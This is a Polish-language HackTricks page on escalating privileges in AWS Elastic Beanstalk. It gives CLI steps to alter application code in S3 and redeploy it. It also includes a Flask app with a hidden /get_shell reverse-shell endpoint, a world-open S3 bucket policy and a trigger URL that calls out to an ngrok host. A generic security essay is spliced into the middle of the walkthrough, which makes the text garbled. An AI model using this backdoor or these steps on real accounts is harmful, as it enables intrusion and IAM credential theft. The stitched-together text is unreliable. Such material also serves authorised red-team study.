# AWS - Eskalacja uprawnie w Elastic Beanstalk

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Elastic Beanstalk

Wicej **informacji na temat Elastic Beanstalk** znajdziesz w:

{% content-ref url="../aws-services/aws-elastic-beanstalk-enum.md" %}
[aws-elastic-beanstalk-enum.md](../aws-services/aws-elastic-beanstalk-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Aby wykonywa czynnoci o du偶ej wra偶liwoci w Beanstalk, bdziesz potrzebowa **wielu wra偶liwych uprawnie w wielu r贸偶nych usugach**. Mo偶esz sprawdzi na przykad uprawnienia przypisane do **`arn:aws:iam::aws:policy/AdministratorAccess-AWSElasticBeanstalk`**
{% endhint %}

### `elasticbeanstalk:RebuildEnvironment`, uprawnienia do zapisu w S3 i wiele innych

Posiadajc **uprawnienia do zapisu w kubeku S3**, kt贸ry zawiera **kod** rodowiska oraz uprawnienia do **przebudowy** aplikacji (wymagane jest `elasticbeanstalk:RebuildEnvironment` oraz kilka innych zwizanych z `S3`, `EC2` i `Cloudformation`), mo偶na **modyfikowa** kod, **przebudowywa** aplikacj, a nastpnym razem, gdy uzyskasz dostp do aplikacji, zostanie **wykonany tw贸j nowy kod**, umo偶liwiajc atakujcemu skompromitowanie aplikacji i powiadcze roli IAM.
```bash
# Create folder
mkdir elasticbeanstalk-eu-west-1-947247140022
cd elasticbeanstalk-eu-west-1-947247140022
# Download code
aws s3 sync s3://elasticbeanstalk-eu-west-1-947247140022 .
# Change code
unzip 1692777270420-aws-flask-app.zip
zip 1692777270420-aws-flask-app.zip <files to zip>
# Upload code
aws s3 cp 1692777270420-aws-flask-app.zip s3://elasticbeanstalk-eu-west-1-947247140022/1692777270420-aws-flask-app.zip
# Rebuild env
aws elasticbeanstalk rebuild-environment --environment-name "env-name"
```
{% endcode %}

### `elasticbeanstalk:CreateApplication`, `elasticbeanstalk:CreateEnvironment`, `elasticbeanstalk:CreateApplicationVersion`, `elasticbeanstalk:UpdateEnvironment`, `iam:PassRole`, i wicej...

Wymienione uprawnienia, a tak偶e kilka uprawnie **`S3`**, **`EC2`, `cloudformation`**, **`autoscaling`** i **`elasticloadbalancing`**, s niezbdne do utworzenia scenariusza Elastic Beanstalk od podstaw.

* Utw贸rz aplikacj AWS Elastic Beanstalk:
```bash
aws elasticbeanstalk create-application --application-name MyApp
```
* Utw贸rz rodowisko AWS Elastic Beanstalk ([**obsugiwane platformy**](https://docs.aws.amazon.com/elasticbeanstalk/latest/platforms/platforms-supported.html#platforms-supported.python)):

{% code overflow="wrap" %}
```bash
aws elasticbeanstalk create-environment --application-name MyApp --environment-name MyEnv --solution-stack-name "64bit Amazon Linux 2 v3.4.2 running Python 3.8" --option-settings Namespace=aws:autoscaling:launchconfiguration,OptionName=IamInstanceProfile,Value=aws-elasticbeanstalk-ec2-role
```
{% endcode %}

Jeli rodowisko jest ju偶 utworzone i **nie chcesz tworzy nowego**, mo偶esz po prostu **zaktualizowa** istniejce.

* Spakuj kod aplikacji i zale偶noci do pliku ZIP:
```python
zip -r MyApp.zip .
```
* Przelij plik ZIP do kubeka S3:
```python
aws s3 cp MyApp.zip s3://elasticbeanstalk-<region>-<accId>/MyApp.zip
```
* Utw贸rz wersj aplikacji AWS Elastic Beanstalk:

{% code overflow="wrap" %}
```css
aws elasticbeanstalk create-application-version --application-name MyApp --version-label MyApp-1.0 --source-bundle S3Bucket="elasticbeanstalk-<region>-<accId>",S3Key="MyApp.zip"
```
{% endcode %}

* Wdro偶 aplikacj wersji do swojego rodowiska AWS Elastic Beanstalk:

{% code overflow="wrap" %}
```bash
aws elasticbeanstalk update-environment --environment-name MyEnv --version-label MyApp-1.0
```
{% endcode %}

### `elasticbeanstalk:CreateApplicationVersion`, `elasticbeanstalk:UpdateEnvironment`, `cloudformation:GetTemplate`, `cloudformation:DescribeStackResources`, `cloudformation:DescribeStackResource`, `autoscaling:DescribeAutoScalingGroups`, `autoscaling:SuspendProcesses`, `autoscaling:SuspendProcesses`

Po pierwsze, musisz utworzy **legitymne rodowisko Beanstalk** z **kodem**, kt贸ry chcesz uruchomi na **ofierze**, postpujc zgodnie z **poprzednimi krokami**. Potencjalnie prosty **zip** zawierajcy te **2 pliki**:

{% tabs %}
{% tab title="application.py" %}
```python
from flask import Flask, request, jsonify
import subprocess,os, socket

application = Flask(__name__)

@application.errorhandler(404)
def page_not_found(e):
return jsonify('404')

@application.route("/")
def index():
return jsonify('Welcome!')


@application.route("/get_shell")
def search():
host=request.args.get('host')
port=request.args.get('port')
if host and port:
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,int(port)))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
return jsonify('done')

if __name__=="__main__":
application.run()
```
{% tab title="requirements.txt" %}
```
click==7.1.2
Flask==1.1.2
itsdangerous==1.1.0
Jinja2==2.11.3
MarkupSafe==1.1.1
Werkzeug==1.0.1
```
{% endtab %}
{% endtabs %}

Gdy ju偶 masz **uruchomione swoje rodowisko Beanstalk** z odwr贸conym powok, nadszed czas, aby **przenie** je do rodowiska **ofiary**. Aby to zrobi, musisz **zaktualizowa polityk kubeka** S3 swojego Beanstalk, aby **ofiara miaa do niego dostp** (Nale偶y zauwa偶y, 偶e to spowoduje **otwarcie** kubeka dla **KA呕DEGO**):
```json
{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "eb-af163bf3-d27b-4712-b795-d1e33e331ca4",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"s3:ListBucket",
"s3:ListBucketVersions",
"s3:GetObject",
"s3:GetObjectVersion",
"s3:*"
],
"Resource": [
"arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022",
"arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022/*"
]
},
{
"Sid": "eb-58950a8c-feb6-11e2-89e0-0800277d041b",
"Effect": "Deny",
"Principal": {
"AWS": "*"
},
"Action": "s3:DeleteBucket",
"Resource": "arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022"
}
]
}
```
# Eskalacja uprawnie w AWS Elastic Beanstalk

## Wprowadzenie

AWS Elastic Beanstalk to usuga chmurowa, kt贸ra umo偶liwia atwe wdra偶anie, skalowanie i zarzdzanie aplikacjami internetowymi. W ramach tej usugi, aplikacje s uruchamiane na instancjach EC2, a zarzdzanie jest uproszczone dziki automatycznemu skalowaniu i zarzdzaniu infrastruktur.

W przypadku eskalacji uprawnie w AWS Elastic Beanstalk, atakujcy mo偶e uzyska wiksze uprawnienia ni偶 mu przysuguj, co mo偶e prowadzi do nieautoryzowanego dostpu do zasob贸w i danych.

## Sabe konfiguracje

### 1. Wykorzystanie bdnej konfiguracji IAM

Jeli u偶ytkownik lub rola IAM ma nadmiarowe uprawnienia, atakujcy mo偶e wykorzysta te uprawnienia do uzyskania dostpu do zasob贸w, do kt贸rych nie powinien mie dostpu. Mo偶e to obejmowa dostp do innych usug AWS lub manipulacj konfiguracj aplikacji.

### 2. Wykorzystanie bdnej konfiguracji dostpu do bazy danych

Jeli aplikacja korzysta z bazy danych, a jej konfiguracja dostpu jest nieprawidowa, atakujcy mo偶e uzyska dostp do bazy danych i wykonywa nieautoryzowane operacje, takie jak odczyt, modyfikacja lub usunicie danych.

### 3. Wykorzystanie bdnej konfiguracji dostpu do plik贸w

Jeli aplikacja przechowuje poufne pliki na serwerze Elastic Beanstalk, a konfiguracja dostpu do tych plik贸w jest nieprawidowa, atakujcy mo偶e uzyska dostp do tych plik贸w i wykonywa nieautoryzowane operacje, takie jak odczyt, modyfikacja lub usunicie.

## Wykorzystanie podatnoci

### 1. Wykorzystanie podatnoci w aplikacji

Atakujcy mo偶e wykorzysta podatnoci w aplikacji uruchamianej na Elastic Beanstalk do uzyskania dostpu do zasob贸w lub danych. Mo偶e to obejmowa podatnoci w kodzie aplikacji, niewaciwe walidacje danych, bdy konfiguracji itp.

### 2. Wykorzystanie podatnoci w systemie operacyjnym

Jeli instancje EC2 uruchamiane przez Elastic Beanstalk maj podatnoci w systemie operacyjnym, atakujcy mo偶e wykorzysta te podatnoci do uzyskania dostpu do instancji i dalszej eskalacji uprawnie.

## Podsumowanie

Eskalacja uprawnie w AWS Elastic Beanstalk mo偶e prowadzi do nieautoryzowanego dostpu do zasob贸w i danych. Aby zabezpieczy aplikacje uruchamiane na Elastic Beanstalk, nale偶y skonfigurowa odpowiednie uprawnienia IAM, dostp do bazy danych i dostp do plik贸w. Ponadto, nale偶y regularnie aktualizowa aplikacje i system operacyjny, aby zapobiec wykorzystaniu podatnoci.
```bash
# Use a new --version-label
# Use the bucket from your own account
aws elasticbeanstalk create-application-version --application-name MyApp --version-label MyApp-2.0 --source-bundle S3Bucket="elasticbeanstalk-<region>-<accId>",S3Key="revshell.zip"

# These step needs the extra permissions
aws elasticbeanstalk update-environment --environment-name MyEnv --version-label MyApp-1.0

# To get your rev shell just access the exposed web URL with params such as:
http://myenv.eba-ankaia7k.us-east-1.elasticbeanstalk.com/get_shell?host=0.tcp.eu.ngrok.io&port=13528
```
{% endcode %}

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
